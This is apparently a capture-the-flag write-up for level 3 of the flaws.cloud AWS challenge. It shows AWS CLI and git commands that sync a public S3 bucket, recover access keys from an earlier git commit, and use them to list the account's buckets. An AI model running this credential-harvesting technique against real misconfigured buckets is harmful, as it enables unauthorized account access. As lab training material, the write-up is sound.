# Problem
The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are.


# Solution
We start by using the same approach from the last two problems:
```
$ aws s3 ls level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
                           PRE .git/
2017-02-26 16:14:33     123637 authenticated_users.png
2017-02-26 16:14:34       1552 hint1.html
2017-02-26 16:14:34       1426 hint2.html
2017-02-26 16:14:35       1247 hint3.html
2017-02-26 16:14:33       1035 hint4.html
2020-05-22 11:21:10       1861 index.html
2017-02-26 16:14:33         26 robots.txt
```

This is something we haven't seen before. An initialized Git version control within the bucket. Let's download this bucket and see what's inside:
```
$ mkdir level3
$ cd level3
$ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud .
```

I dug around the `.git` directory but didn't find anything too juicy. I then decided to check the logs:
```
$ git log
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```

Huh! It looks like there was an initial commit then a "correctional" commit. Let's check to see what the files looked like at the point in time of the first commit:
```
$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61

$ ls
access_keys.txt         hint1.html              hint3.html              index.html
authenticated_users.png hint2.html              hint4.html              robots.txt
```

Boom! Access keys. These keys are used to access an AWS account through the command line. Let's configure our current command line tool to use these keys:
```
$ aws configure
# enter access keys here
```

Then, we can go look for other buckets as the initial problem statement hinted at.
```
$ aws s3 ls
2020-06-25 10:43:56 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2020-06-26 16:06:07 config-bucket-975426262029
2020-06-27 03:46:15 flaws-logs
2020-06-27 03:46:15 flaws.cloud
2020-06-27 08:27:14 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2020-06-27 08:27:14 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2020-06-27 08:27:14 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2020-06-27 08:27:15 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2020-06-27 08:27:15 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2020-06-27 19:29:47 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

Done! We see all the different Buckets this account has access to. We can move on to level 4.


# References
https://docs.aws.amazon.com/cli/latest/reference/s3/index.html
https://docs.aws.amazon.com/general/latest/gr/aws-sec-cred-types.html
http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud.s3.amazonaws.com
